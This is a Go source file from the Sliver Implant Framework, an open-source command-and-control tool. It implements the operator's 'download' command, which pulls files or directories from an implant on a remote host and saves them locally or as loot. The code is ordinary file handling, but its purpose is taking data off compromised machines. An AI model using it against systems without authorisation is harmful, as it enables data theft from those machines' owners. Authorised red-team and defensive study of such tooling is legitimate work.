package filesystem

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"time"

	"github.com/bishopfox/sliver/client/command/loot"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util/encoders"
	"github.com/spf13/cobra"
	"google.golang.org/protobuf/proto"
	"gopkg.in/AlecAivazis/survey.v1"
)

func DownloadCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	remotePath := args[0]
	recurse, _ := cmd.Flags().GetBool("recurse")

	ctrl := make(chan bool)
	con.SpinUntil(fmt.Sprintf("Downloading %s ...", remotePath), ctrl)
	download, err := con.Rpc.Download(context.Background(), &sliverpb.DownloadReq{
		Request:          con.ActiveTarget.Request(cmd),
		Path:             remotePath,
		Recurse:          recurse,
		RestrictedToFile: false,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	if download.Response != nil && download.Response.Async {
		con.AddBeaconCallback(download.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, download)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			HandleDownloadResponse(download, cmd, args, con)
		})
		con.PrintAsyncResponse(download.Response)
	} else {
		HandleDownloadResponse(download, cmd, args, con)
	}
}

func prettifyDownloadName(path string) string {
	nonAlphaNumericRegex, err := regexp.Compile("[^a-zA-Z0-9]+")
	if err != nil {
		// Well, we tried.
		return path
	}

	pathNoSeparators := strings.ReplaceAll(path, "\\", "_")
	pathNoSeparators = strings.ReplaceAll(pathNoSeparators, "/", "_")

	filteredString := nonAlphaNumericRegex.ReplaceAllString(pathNoSeparators, "_")

	// Collapse multiple underscores into one
	multipleUnderscoreRegex, err := regexp.Compile("_{2,}")
	if err != nil {
		return filteredString
	}

	filteredString = multipleUnderscoreRegex.ReplaceAllString(filteredString, "_")

	// If there is an underscore at the front of the filename, strip that off
	filteredString, _ = strings.CutPrefix(filteredString, "_")

	return filteredString
}

func HandleDownloadResponse(download *sliverpb.Download, cmd *cobra.Command, args []string, con *console.SliverClient) {
	var err error
	if download.Response != nil && download.Response.Err != "" {
		con.PrintErrorf("%s\n", download.Response.Err)
		return
	}

	if download.Encoder == "gzip" {
		download.Data, err = new(encoders.Gzip).Decode(download.Data)
		if err != nil {
			con.PrintErrorf("Decoding failed %s", err)
		}
	}

	// Use download.Path because a glob matching a single file on the remote will not have the
	// correct file name - the filename will contain the globs if we use the path from the user
	// On non-Windows systems, filepath.Base will not see backslashes, so we will replace them
	// on systems that do not use backslashes as path separators
	remotePath := download.Path
	if strings.Contains(download.Path, "\\") && string(os.PathSeparator) != "\\" {
		remotePath = strings.ReplaceAll(download.Path, "\\", "/")
	}

	var localPath string
	if len(args) == 1 {
		localPath = "."
	} else {
		localPath = args[1]
	}
	saveLoot, _ := cmd.Flags().GetBool("loot")

	if download.ReadFiles == 0 {
		// No files downloaded successfully.
		con.PrintErrorf("No files downloaded from the implant - check permissions, path, and / or filters.\n")
		return
	}

	if saveLoot {
		lootName, _ := cmd.Flags().GetString("name")
		// Hand off to the loot package to take care of looting
		fType, _ := cmd.Flags().GetString("file-type")
		fileType := loot.ValidateLootFileType(fType, download.Data)
		loot.LootDownload(download, lootName, fileType, cmd, con)
	} else {
		fileName := filepath.Base(remotePath)
		dst, err := filepath.Abs(localPath)
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}

		fi, err := os.Stat(dst)
		if err != nil && !os.IsNotExist(err) {
			con.PrintErrorf("%s\n", err)
			return
		}
		if err == nil && fi.IsDir() {
			if download.IsDir {
				// Come up with a good file name - filters might make the filename ugly
				session, beacon := con.ActiveTarget.Get()
				implantName := ""
				if session != nil {
					implantName = session.Name
				} else if beacon != nil {
					implantName = beacon.Name
				}

				fileName = fmt.Sprintf("%s_download_%s_%d.tar.gz", filepath.Base(implantName), filepath.Base(prettifyDownloadName(remotePath)), time.Now().Unix())
			}
			if runtime.GOOS == "windows" {
				// Windows has a file path length of 260 characters
				// +1 for the path separator before the file name
				if len(dst)+len(fileName)+1 > 260 {
					// Make an effort to shorten the file name. If this does not work, the operator will have to find somewhere else to put the file
					fileName = fmt.Sprintf("down_%d.tar.gz", time.Now().Unix())
				}
			}
			dst = filepath.Join(dst, fileName)
		}

		// Add an extension to a directory download if one is not provided.
		if download.IsDir && (!strings.HasSuffix(dst, ".tgz") && !strings.HasSuffix(dst, ".tar.gz")) {
			dst += ".tar.gz"
		}

		if _, err := os.Stat(dst); err == nil {
			overwrite := false
			prompt := &survey.Confirm{Message: "Overwrite local file?"}
			survey.AskOne(prompt, &overwrite, nil)
			if !overwrite {
				return
			}
		}

		dstFile, err := os.Create(dst)
		if err != nil {
			con.PrintErrorf("Failed to open local file %s: %s\n", dst, err)
			return
		}
		defer dstFile.Close()
		n, err := dstFile.Write(download.Data)
		if err != nil {
			con.PrintErrorf("Failed to write data %v\n", err)
		} else {
			var readFilesText string
			var unreadFilesText string

			if download.ReadFiles == 1 {
				readFilesText = "file"
			} else {
				readFilesText = "files"
			}

			if download.UnreadableFiles == 1 {
				unreadFilesText = "file"
			} else {
				unreadFilesText = "files"
			}

			con.PrintInfof("Wrote %d bytes (%d %s successfully, %d %s unsuccessfully) to %s\n",
				n,
				download.ReadFiles,
				readFilesText,
				download.UnreadableFiles,
				unreadFilesText,
				dstFile.Name())
		}
	}
}
